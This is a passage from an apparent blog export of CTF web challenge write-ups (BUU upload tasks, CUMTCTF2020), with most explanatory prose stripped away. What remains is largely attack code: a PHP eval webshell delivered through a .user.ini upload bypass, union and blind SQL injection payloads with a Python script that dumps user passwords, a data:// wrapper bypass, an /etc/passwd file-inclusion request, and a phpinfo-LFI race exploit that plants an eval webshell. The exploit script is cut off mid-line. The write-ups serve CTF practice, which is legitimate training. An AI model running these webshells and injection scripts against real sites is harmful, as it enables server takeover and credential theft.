for&#x3D;&quot;file&quot;&gt;&lt;&#x2F;label&gt;</span><br><span class=\"line\">        &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;fileUpload&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt;</span><br><span class=\"line\">        &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;upload&quot; value&#x3D;&quot;&quot;&gt;</span><br><span class=\"line\">    &lt;&#x2F;form&gt;</span><br><span class=\"line\">&lt;&#x2F;body&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;&#x2F;html&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">&#x2F;&#x2F; error_reporting(0);</span><br><span class=\"line\">$userdir &#x3D; &quot;uploads&#x2F;&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]); &#x2F;&#x2F;</span><br><span class=\"line\">if (!file_exists($userdir)) &#123;</span><br><span class=\"line\">    mkdir($userdir, 0777, true); &#x2F;&#x2F;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">file_put_contents($userdir . &quot;&#x2F;index.php&quot;, &quot;&quot;);</span><br><span class=\"line\">if (isset($_POST[&quot;upload&quot;])) &#123;</span><br><span class=\"line\">    $tmp_name &#x3D; $_FILES[&quot;fileUpload&quot;][&quot;tmp_name&quot;];</span><br><span class=\"line\">    $name &#x3D; $_FILES[&quot;fileUpload&quot;][&quot;name&quot;];</span><br><span class=\"line\">    if (!$tmp_name) &#123;  &#x2F;&#x2F;</span><br><span class=\"line\">        die(&quot;filesize too big!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if (!$name) &#123;  &#x2F;&#x2F;</span><br><span class=\"line\">        die(&quot;filename cannot be empty!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $extension &#x3D; substr($name, strrpos($name, &quot;.&quot;) + 1); &#x2F;&#x2F;</span><br><span class=\"line\">    if (preg_match(&quot;&#x2F;ph|htacess&#x2F;i&quot;, $extension)) &#123;</span><br><span class=\"line\">        die(&quot;illegal suffix!&quot;);  &#x2F;&#x2F;phhtaccess</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if (mb_strpos(file_get_contents($tmp_name), &quot;&lt;?&quot;) !&#x3D;&#x3D; FALSE) &#123;</span><br><span class=\"line\">        die(&quot;&lt;? in contents!&quot;);  &#x2F;&#x2F;&lt;?</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $image_type &#x3D; exif_imagetype($tmp_name);  &#x2F;&#x2F;</span><br><span class=\"line\">    if (!$image_type) &#123;</span><br><span class=\"line\">        die(&quot;exif_imagetype:not image!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $upload_file_path &#x3D; $userdir . &quot;&#x2F;&quot; . $name;</span><br><span class=\"line\">    move_uploaded_file($tmp_name, $upload_file_path);</span><br><span class=\"line\">    echo &quot;Your dir &quot; . $userdir. &#39; &lt;br&gt;&#39;;</span><br><span class=\"line\">    echo &#39;Your files : &lt;br&gt;&#39;;</span><br><span class=\"line\">    var_dump(scandir($userdir));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p></p>\n<p><strong>exif_imagetype()</strong></p>\n<blockquote>\n<p></p>\n<ul>\n<li>JPG FF D8 FF E0 00 10 4A 46 49 46</li>\n<li>GIF(GIF89a)47 49 46 38 39 61</li>\n<li>PNG 89 50 4E 47</li>\n</ul>\n</blockquote>\n<p>.user.ini</p>\n<blockquote>\n<p><a href=\"https://wooyun.js.org/drops/user.iniPHP.html\" target=\"_blank\" rel=\"noopener\">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p>\n<p>.user.iniphp.iniPHP_INI_PERDIR  PHP_INI_USERPHP_INI_PERDIR.user.ini</p>\n<p><br>auto_append_fileauto_prepend_file<br>require()auto_append_file .user.ini</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;auto_prepend_file&#x3D;test.jpg</span><br></pre></td></tr></table></figure>\n<p>test.jpg</p>\n<p></p>\n<p>.php.user.inigetshell.user.iniphp </p>\n</blockquote>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;a&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>\n<p>flag</p>\n<p><strong></strong></p>\n<h2 id=\"-2019-Upload\"><a href=\"#-2019-Upload\" class=\"headerlink\" title=\"[ 2019]Upload\"></a>[ 2019]Upload</h2><p>phtml</p>\n<p>flag</p>\n<h2 id=\"ACTF2020--BackupFile\"><a href=\"#ACTF2020--BackupFile\" class=\"headerlink\" title=\"[ACTF2020 ]BackupFile\"></a>[ACTF2020 ]BackupFile</h2><p>index.php.bak</p>\n<p>123flag</p>\n<h2 id=\"ACTF2020--Upload\"><a href=\"#ACTF2020--Upload\" class=\"headerlink\" title=\"[ACTF2020 ]Upload\"></a>[ACTF2020 ]Upload</h2><p>flag</p>\n<h2 id=\"-2019-Knife\"><a href=\"#-2019-Knife\" class=\"headerlink\" title=\"[ 2019]Knife\"></a>[ 2019]Knife</h2><p>flag</p>\n","categories":["BUU"],"tags":["BUU"]},{"title":"CUMTCTF2020","url":"https://pz1o.top/2020/09/25/CUMTCTF2020/","content":"<a id=\"more\"></a>\n<h1 id=\"CUMTCTF2020\"><a href=\"#CUMTCTF2020\" class=\"headerlink\" title=\"CUMTCTF2020\"></a>CUMTCTF2020</h1><p></p>\n<h1 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h1><h2 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h2><p><img src=\"/2020/09/25/CUMTCTF2020/image-20200925183359837.png\" alt=\"image-20200925183359837\"></p>\n<p>get1post2flag.phpflag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#CUMTCTF&#123;179055b4-e8f5-42d2-bfe4-027d15e946b2&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Babysqli\"><a href=\"#Babysqli\" class=\"headerlink\" title=\"Babysqli\"></a>Babysqli</h2><p>sql/**/,union</p>\n<p>payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#</span><br><span class=\"line\">1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()),5,6,7,8#</span><br><span class=\"line\">#emails,users</span><br><span class=\"line\">1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,(select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&#39;emails&#39;),5,6,7,8#</span><br><span class=\"line\">#id,email_id</span><br><span class=\"line\">1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,(select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&#39;users&#39;),5,6,7,8#</span><br><span class=\"line\">#user_id,first_name,last_name,user,password,avatar,last_login,failed_login</span><br><span class=\"line\">1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,(select&#x2F;**&#x2F;group_concat(password)&#x2F;**&#x2F;from&#x2F;**&#x2F;users),5,6,7,8#</span><br><span class=\"line\">#CUMTCTF&#123;27ec8034-c9fe-0cfd-d92a-84362ecf0e42&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Secret\"><a href=\"#Secret\" class=\"headerlink\" title=\"Secret\"></a>Secret</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">view-source:http:&#x2F;&#x2F;202.119.201.197:13005&#x2F;secret.jpg</span><br></pre></td></tr></table></figure>\n<p>php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">include_once</span>(<span class=\"string\">'flag.php'</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'param1'</span>]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $str1=$_GET[<span class=\"string\">'param1'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(file_get_contents($str1)!==<span class=\"string\">'Suvin_wants_a_girlfriend'</span>)</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">\"Suvin doesn't like you\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'param2'</span>]))&#123;</span><br><span class=\"line\">        $str2=$_GET[<span class=\"string\">'param2'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!is_numeric($str2))</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">'Suvin prefers strings of Numbers'</span>);</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>($str2&lt;<span class=\"number\">3600</span>*<span class=\"number\">24</span>*<span class=\"number\">30</span>)</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">'Suvin says the num is too short'</span>);</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>($str2&gt;<span class=\"number\">3600</span>*<span class=\"number\">24</span>*<span class=\"number\">31</span>)</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">'Suvin says the num is too long'</span>);</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"Suvin says he's falling in love with you!\"</span>.<span class=\"string\">\"&lt;/br&gt;\"</span>;</span><br><span class=\"line\">            sleep(intval($str2)); </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'param1'</span>]) &amp;&amp; <span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'param2'</span>])) &#123;</span><br><span class=\"line\">            $str1=$_POST[<span class=\"string\">'param1'</span>];</span><br><span class=\"line\">            $str2=$_POST[<span class=\"string\">'param2'</span>];</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(strlen($str1)&gt;<span class=\"number\">1000</span>)</span><br><span class=\"line\">                <span class=\"keyword\">die</span>(<span class=\"string\">\"It's too long\"</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(((string)$str1!==(string)$str2)&amp;&amp;(sha1($str1)===sha1($str2)))</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> $flag;</span><br><span class=\"line\">            <span class=\"keyword\">else</span> </span><br><span class=\"line\">                <span class=\"keyword\">die</span>(<span class=\"string\">\"It's so similar to md5\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>getparam1data://</p>\n<p>getparam2sleep</p>\n<p>payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;202.119.201.197:13005&#x2F;index.php?param2&#x3D;0.26e07&amp;param1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,Suvin_wants_a_girlfriend</span><br></pre></td></tr></table></figure>\n<p>post12sha1zhe</p>\n<p>sha1,pdf12flag</p>\n<p><img src=\"/2020/09/25/CUMTCTF2020/image-20200925185006355.png\" alt=\"image-20200925185006355\"></p>\n<h2 id=\"Babysqli2\"><a href=\"#Babysqli2\" class=\"headerlink\" title=\"Babysqli2\"></a>Babysqli2</h2><p><strong>substr()mid()</strong></p>\n<p>left</p>\n<p></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"comment\">#dict = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.-&#123;&#125;,'</span></span><br><span class=\"line\">dict=<span class=\"string\">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'\"|\\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class=\"line\">url = <span class=\"string\">'http://202.119.201.197:13004/index.php'</span></span><br><span class=\"line\">flag = <span class=\"string\">''</span></span><br><span class=\"line\">j = <span class=\"string\">''</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">400</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> a <span class=\"keyword\">in</span> dict:</span><br><span class=\"line\">        <span class=\"comment\">#payload = \"or/**/1=(case/**/when/**/(left(database(),&#123;&#125;)=0x&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)#\".format(i, binascii.b2a_hex(j + a))</span></span><br><span class=\"line\">        <span class=\"comment\">#payload = \"or/**/1=(case/**/when/**/(left((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;&#125;)=0x&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)#\".format(i,binascii.b2a_hex(j+a))</span></span><br><span class=\"line\">        <span class=\"comment\">#payload = \"or/**/1=(case/**/when/**/(left((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x7573657273),&#123;&#125;)=0x&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)#\".format(i,binascii.b2a_hex(j + a))</span></span><br><span class=\"line\">        payload = <span class=\"string\">\"or/**/1=(case/**/when/**/(left((select/**/group_concat(password)/**/from/**/users),&#123;&#125;)=0x&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)#\"</span>.format(i, binascii.b2a_hex(j + a))</span><br><span class=\"line\">        <span class=\"comment\">#print(payload)</span></span><br><span class=\"line\">        <span class=\"comment\">#cumtctf</span></span><br><span class=\"line\">        <span class=\"comment\">#emails users</span></span><br><span class=\"line\">        <span class=\"comment\">#id id username,password</span></span><br><span class=\"line\">        data = &#123;</span><br><span class=\"line\">            <span class=\"string\">'username'</span> : <span class=\"string\">\"100\\\\\"</span>,</span><br><span class=\"line\">            <span class=\"string\">'password'</span> : payload</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        r = requests.session()</span><br><span class=\"line\">        res = r.post(url=url,data=data)</span><br><span class=\"line\">        <span class=\"comment\">#print(res.content)</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">'Wrong username'</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> res.content:</span><br><span class=\"line\">            j += a</span><br><span class=\"line\">            flag +=a</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    print(flag)</span><br></pre></td></tr></table></figure>\n<p></p>\n<h2 id=\"Try-GET-file\"><a href=\"#Try-GET-file\" class=\"headerlink\" title=\"Try:GET_file\"></a>Try:GET_file</h2><p>phpinfo.php</p>\n<p></p>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/09/25/CUMTCTF2020/image-20200925185651724.png\" alt=\"image-20200925185651724\"></p>\n<p>phpinfo</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PHPPOSTphp&#x2F;tmp&#x2F;php[6]phpinfophpinfophpinfo</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">1webshellphpinfoheaderget</span><br><span class=\"line\"></span><br><span class=\"line\">2phpinfophpinfo</span><br><span class=\"line\"></span><br><span class=\"line\">3PHP4096PHP4096socket</span><br><span class=\"line\"></span><br><span class=\"line\">4socket4096</span><br><span class=\"line\"></span><br><span class=\"line\">5socketPHP4096</span><br><span class=\"line\"></span><br><span class=\"line\">6getshell</span><br></pre></td></tr></table></figure>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python </span></span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">setup</span><span class=\"params\">(host, port)</span>:</span></span><br><span class=\"line\">    TAG=<span class=\"string\">\"Security Test\"</span></span><br><span class=\"line\">    PAYLOAD=<span class=\"string\">\"\"\"%s\\r</span></span><br><span class=\"line\"><span class=\"string\">&lt;?php file_put_contents('/tmp/g', '&lt;?=eval($_REQUEST[1])?&gt;')?&gt;\\r\"\"\"</span> % TAG</span><br><span class=\"line\">    REQ1_DATA=<span class=\"string\">\"\"\"-----------------------------7dbff1ded0714\\r</span></span><br><span class=\"line\"><span class=\"string\">Content-Disposition: form-data; name=\"dummyname\"; filename=\"test.txt\"\\r</span></span><br><span class=\"line\"><span class=\"string\">Content-Type: text/plain\\r</span></span><br><span class=\"line\"><span class=\"string\">\\r</span></span><br><span class=\"line\"><span class=\"string\">%s</span></span><br><span class=\"line\"><span class=\"string\">-----------------------------7dbff1ded0714--\\r\"\"\"</span> % PAYLOAD</span><br><span class=\"line\">    padding=<span class=\"string\">\"A\"</span> * <span class=\"number\">5000</span></span><br><span class=\"line\">    REQ1=<span class=\"string\">\"\"\"POST /phpinfo.php?a=\"\"\"</span>+padding+<span class=\"string\">\"\"\" HTTP/1.1\\r</span></span><br><span class=\"line\"><span class=\"string\">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=\"\"\"</span>+padding+<span class=\"string\">\"\"\"\\r</span></span><br><span class=\"line\"><span class=\"string\">HTTP_ACCEPT: \"\"\"</span> + padding + <span class=\"string\">\"\"\"\\r</span></span><br><span class=\"line\"><span class=\"string\">HTTP_USER_AGENT: \"\"\"</span>+padding+<span class=\"string\">\"\"\"\\r</span></span><br><span class=\"line\"><span class=\"string\">HTTP_ACCEPT_LANGUAGE: \"\"\"</span>+padding+<span class=\"string\">\"\"\"\\r</span></span><br><span class=\"line\"><span class=\"string\">HTTP_PRAGMA: \"\"\"</span>+padding+<span class=\"string\">\"\"\"\\r</span></span><br><span class=\"line\"><span class=\"string\">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\\r</span></span><br><span class=\"line\"><span class=\"string\">Content-Length: %s\\r</span></span><br><span class=\"line\"><span class=\"string\">Host: %s\\r</span></span><br><span class=\"line\"><span class=\"string\">\\r</span></span><br><span class=\"line\"><span class=\"string\">%s\"\"\"</span> %(len(REQ1_DATA),host,REQ1_DATA)</span><br><span class=\"line\">    <span class=\"comment\">#modify this to suit the LFI script   </span></span><br><span class=\"line\">    LFIREQ=<span class=\"string\">\"\"\"GET /index.php?file=%s HTTP/1.1\\r</span></span><br><span class=\"line\"><span class=\"string\">User-Agent: Mozilla/4.0\\r</span></span><br><span class=\"line\"><span class=\"string\">Proxy-Connection: Keep-Alive\\r</span></span><br><span class=\"line\"><span class=\"string\">Host: %s\\r</span></span><br><span class=\"line\"><span class=\"string\">\\r</span></span><br><span class=\"line\"><span class=\"string\">\\r</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> (REQ1, TAG, LFIREQ)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">phpInfoLFI</span><span class=\"params\">(host, port, phpinforeq, offset, lfireq, tag)</span>:</span></span><br><span class=\"line\">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\"></span><br><span class=\"line\">    s.connect((host, port))</span><br><span class=\"line\">    s2.connect((host, port))</span><br><span class=\"line\"></span><br><span class=\"line\">    s.send(phpinforeq)</span><br><span class=\"line\">    d = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> len(d) &lt; offset:</span><br><span class=\"line\">        d += s.recv(offset)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        i = d.index(<span class=\"string\">\"[tmp_name] =&amp;gt; \"</span>)</span><br><span class=\"line\">        fn = d[i+<span class=\"number\">17</span>:i+<span class=\"number\">31</span>]</span><br><span class=\"line\">    <span class=\"keyword\">except</span> ValueError:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span 